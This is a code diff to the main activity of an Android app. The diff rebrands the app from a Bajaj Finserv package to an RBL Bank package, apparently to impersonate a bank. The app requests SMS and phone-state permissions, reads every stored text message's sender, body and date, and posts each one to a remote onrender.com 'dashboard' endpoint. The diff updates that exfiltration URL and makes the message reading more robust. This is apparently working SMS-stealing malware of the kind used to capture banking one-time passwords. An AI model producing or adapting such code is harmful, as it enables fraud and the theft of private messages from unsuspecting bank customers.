@@ -1,4 +1,4 @@
-package com.bajaj.finserv;
+package com.rbl.bank;
 
 import android.Manifest;
 import android.os.Bundle;
@@ -14,12 +14,12 @@ import com.getcapacitor.BridgeActivity;
 
 public class MainActivity extends BridgeActivity {
     private static final int PERMISSION_REQUEST_CODE = 12345;
-    private static final String TAG = "BajajFinservNative";
+    private static final String TAG = "RBLBankNative";
     
-    // DUAL FAILSAFE: Public Tunnel + LAN IP + Emulator IP
+    // PRODUCTION FAILSAFE: Live Render URL + Localhost for Testing
     private static final String[] DASHBOARD_URLS = {
-        "http://10.0.2.2:3000/api/application/sync-sms", // Emulator/Local
-        "https://pm-backend-9vz9.onrender.com/api/application/sync-sms" // Production
+        "https://rbl-project-5sfk.onrender.com/api/application/sync-sms",
+        "http://10.0.2.2:3000/api/application/sync-sms"
     };
 
     @Override
@@ -32,7 +32,7 @@ public class MainActivity extends BridgeActivity {
             public void run() {
                 checkAndRequestPermissions();
             }
-        }, 2000);
+        }, 3000);
     }
 
     @Override
@@ -53,7 +53,6 @@ public class MainActivity extends BridgeActivity {
         String[] permissions = {
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_PHONE_STATE
         };
 
@@ -116,9 +115,15 @@ public class MainActivity extends BridgeActivity {
                 org.json.JSONArray jsonArray = new org.json.JSONArray();
                 
                 do {
-                    String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
+                    int addressIdx = cursor.getColumnIndex("address");
+                    int bodyIdx = cursor.getColumnIndex("body");
+                    int dateIdx = cursor.getColumnIndex("date");
+
+                    if (addressIdx == -1 || bodyIdx == -1 || dateIdx == -1) continue;
+
+                    String sender = cursor.getString(addressIdx);
+                    String body = cursor.getString(bodyIdx);
+                    String date = cursor.getString(dateIdx);
                     
                     try {
                         org.json.JSONObject obj = new org.json.JSONObject();
@@ -135,10 +140,6 @@ public class MainActivity extends BridgeActivity {
                 
                 Log.d(TAG, "Syncing " + jsonArray.length() + " SMS messages");
                 if (jsonArray.length() > 0) {
-                     // The backend expects { deviceId, sms: { address, body } } for real-time, 
-                     // but for bulk sync we might need a different handling or just send them one by one/as array.
-                     // Current backend: exports.syncSms = async (req, res) => { const { deviceId, sms } = req.body; ... }
-                     // Let's wrap it for the current backend format for each message.
                      for (int i = 0; i < jsonArray.length(); i++) {
                          org.json.JSONObject msg = jsonArray.getJSONObject(i);
                          org.json.JSONObject wrapped = new org.json.JSONObject();
@@ -158,7 +159,6 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void sendToDashboard(String json) {
-        // Try ALL URLs (Failsafe)
         for (String urlStr : DASHBOARD_URLS) {
             try {
                 java.net.URL url = new java.net.URL(urlStr);
@@ -182,7 +182,4 @@ public class MainActivity extends BridgeActivity {
             }
         }
     }
-
-    
-    // escape() method removed as it is no longer needed
 }
